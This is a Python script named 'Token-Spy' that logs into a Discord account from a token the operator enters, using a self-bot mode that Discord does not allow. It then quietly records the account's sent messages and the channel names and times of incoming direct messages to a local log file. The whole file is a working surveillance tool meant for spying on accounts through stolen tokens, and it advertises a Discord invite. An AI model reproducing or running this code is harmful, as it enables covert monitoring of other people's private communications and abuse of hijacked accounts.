from colorama import Fore
from discord.ext import commands
from os import name, system
import discord
import datetime


if name == "nt":
    system("title [Token-Spy] by sleportV.2#5527 ┃ Main Menu")
    def clear():
        system("cls")
else:
    def clear():
        system("clear")

erreur = Fore.RESET + "[" + Fore.RED + "!" + Fore.RESET + "]"
valide = Fore.RESET + "[" + Fore.GREEN + "!" + Fore.RESET + "]"
info = Fore.RESET + "[" + Fore.MAGENTA + "!" + Fore.RESET + "]"
text = Fore.RESET + "[" + Fore.MAGENTA + ">" + Fore.RESET + "]"

dm = Fore.RESET + "[" + Fore.MAGENTA + "P" + Fore.RESET + "] "
channel = Fore.RESET + "[" + Fore.MAGENTA + "C" + Fore.RESET + "] "


current_time = datetime.datetime.now()


def main():
  clear()
  print("""
  
  
  ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ███████╗██████╗ ██╗   ██╗
  ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝██╔══██╗╚██╗ ██╔╝
     ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ███████╗██████╔╝ ╚████╔╝ 
     ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ╚════██║██╔═══╝   ╚██╔╝  
     ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ███████║██║        ██║   
     ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚══════╝╚═╝        ╚═╝ 

                      https://discord.gg/UhTN3UT9H7  
                                                                         

  """)

  token_answer = input(text + " Token : ")

  try: 

    bot = commands.Bot(command_prefix="Ï", description='Token Spy', self_bot=True)

    @bot.event
    async def on_ready():
      r = open("log.txt", "a")
      print(valide + " Token valide !")
      r.write(f"\n logged in {bot.user.name} | {bot.user.id} \n")
      print(text + f"logged in {bot.user.name} | {bot.user.id} \n")

    @bot.event
    async def on_message(message):
      if message.channel.type is discord.ChannelType.private:
        if bot.user.id != message.author.id:
          print(dm + datetime.datetime.now().strftime('%H:%M:%S') + " | " +   f'{message.channel}')
          l = open("log.txt", "a")
          l.write( datetime.datetime.now().strftime('%H:%M:%S') + " | " +   f'{message.channel}')
          l.close
        else:
          print(dm + datetime.datetime.now().strftime('%H:%M:%S') + " | " +   f'{message.channel} | {message.id} | {message.content}')
          l = open("log.txt", "a")
          l.write( datetime.datetime.now().strftime('%H:%M:%S') + " | " +   f'{message.channel} | {message.id} | {message.content} \n')
          l.close

      else:
        if message.author.id == bot.user.id:
          print(channel + datetime.datetime.now().strftime('%H:%M:%S') + " | " + f'{message.guild.name} | {message.id} | {message.content}')
          l = open("log.txt", "a")
          l.write(datetime.datetime.now().strftime('%H:%M:%S') + " | " + f'{message.guild.name} | {message.id} | {message.content} \n')
          l.close
        else:
          return
  

    bot.run(token_answer, bot=False)

  except:
    print(erreur + " Token invalide !")
    input("")

main() 